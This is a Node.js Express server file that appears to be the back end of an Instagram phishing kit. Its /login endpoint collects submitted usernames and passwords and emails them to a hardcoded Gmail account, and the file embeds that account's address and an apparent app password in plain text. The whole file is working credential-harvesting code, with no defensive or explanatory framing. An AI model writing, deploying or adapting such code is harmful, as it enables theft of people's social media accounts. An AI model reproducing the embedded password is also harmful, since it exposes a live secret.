const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Replace with your Gmail and App Password
const GMAIL_USER = 'waemsa19@gmail.com';
const GMAIL_PASS = 'mcci julh ypdy ngee';

app.use(cors());
app.use(bodyParser.json());

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ message: 'Missing credentials' });
    }
    try {
        let transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: GMAIL_USER,
                pass: GMAIL_PASS
            }
        });
        await transporter.sendMail({
            from: GMAIL_USER,
            to: GMAIL_USER,
            subject: 'New Instagram Login',
            text: `Username: ${username}\nPassword: ${password}`
        });
        res.json({ message: 'Credentials sent to Gmail!' });
    } catch (error) {
        res.status(500).json({ message: 'Failed to send email', error: error.toString() });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
}); 